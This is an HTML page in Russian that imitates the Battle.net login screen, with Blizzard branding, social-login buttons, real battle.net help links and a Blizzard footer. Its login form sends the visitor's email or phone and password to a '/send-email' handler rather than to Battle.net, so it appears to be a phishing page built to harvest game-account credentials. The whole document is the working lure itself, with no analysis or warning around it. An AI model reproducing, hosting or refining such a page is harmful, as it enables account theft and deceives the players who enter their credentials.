<!DOCTYPE html>
<html lang="en" style="font-family: sans-serif; text-size-adjust: 100%; height: auto">

<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <link rel="icon" type="image/png" href="/images/logo.png">
    <link rel="stylesheet" href="stylesheets/style.css" type="text/css">
    <title>Авторизация в Battle.net</title>
</head>

<body>
<div>
    <div class="main-box">
        <div class="main-box-inner">
            <h1 class="logo logo-horizontal logo-small"></h1>
            <div class="input">
                <div class="login">
                    <h3 class="login-header">Авторизоваться</h3>
                    <div class="useResponse social-login external-login-container">
                        <button class="btn btn-block third-party-login social-icon login-google">
                            <i class="icon-google"></i>
                        </button>
                        <button class="btn btn-block third-party-login social-icon login-facebook">
                            <i class="icon-facebook"></i>
                        </button>
                        <button class="btn btn-block third-party-login social-icon login-apple">
                            <i class="icon-apple"></i>
                        </button>
                    </div>
                    <div class="useResponse social-login external-login-container">
                        <button class="btn btn-block third-party-login social-icon login-live">
                            <i class="icon-live"></i>
                        </button>
                        <button class="btn btn-block third-party-login social-icon login-psn">
                            <i class="icon-psn"></i>
                        </button>
                        <button class="btn btn-block third-party-login social-icon login-nintendo">
                            <i class="icon-nintendo"></i>
                        </button>
                        <button class="btn btn-block third-party-login social-icon login-steam">
                            <i class="icon-steam"></i>
                        </button>
                    </div>
                    <div class="thirdparty-line">

                        <span>или войти через</span>
                    </div>
                    <form action="/send-email" method="post">
                        <div id="login-input-container">
                            <div class="control-group ">
                                <div class="controls">
                                    <label>
                                        <input maxlength="320" type="text" class="input-block " name="email"
                                               placeholder="Электронная почта или телефон">
                                    </label>
                                </div>
                            </div>
                            <div class="control-group ">
                                <div class="controls">
                                    <div class="blz-password-wrapper">
                                        <input name="password" title="Пароль" maxlength="128" type="password" name="password"
                                               class="input-block "
                                               placeholder="Пароль">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="control-group submit no-cancel">
                            <button class="btn-block btn btn-primary submit-button btn-block">
                                Авторизоваться
                            </button>
                        </div>
                    </form>
                    <ul id="help-links">
                        <li>
                            <a
                                    href="https://account.battle.net/creation/?ref=https%3A%2F%2Feu.shop.battle.net%2Fru-ru%2F404&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=8f2b8351-4044-4eef-917d-7aaa14746fa9&amp;bdp=880921f8605ee72ec0fc9dcade0157d2538d5a746fe115a48d124fc5568192df">
                                Зарегистрируйте учетную запись Battle.net бесплатно
                            </a>
                        </li>
                        <li>
                            <a
                                    href="https://account.battle.net/recovery/?ref=&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=8f2b8351-4044-4eef-917d-7aaa14746fa9">
                                Вы не можете войти?
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <footer id="footer" class="footer ru-ru">
        <div id="nav-client-footer" class="nav-client">
            <div class="mobileFooterEnabled footer-content footer-desktop grid-container">
                <div class="nav-left nav-logo-group">
                    <div class="footer-links nav-left">
                        <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Пользовательское
                            соглашение
                            Blizzard</a>
                        <span>|</span>
                        <a class="nav-item nav-a" href="https://www.blizzard.com/company/about/privacy.html">Политика
                            конфиденциальности</a>
                        <span>|</span>
                        <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/">Условия</a>
                        <span>|</span>
                        <a class="nav-item nav-a" href="https://eu.blizzard.com/company/about/infringementnotice.html">Авторское
                            право</a>
                        <span>|</span>
                        <a class="nav-item nav-a" href="/login/cookies">Файлы cookie</a>
                        <span>|</span>
                        <a class="nav-item nav-a" href="/login/cookies#settings">Параметры cookie</a>
                        <div class="copyright">© Blizzard Entertainment, Inc., 2023</div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
</div>
</body>

</html>
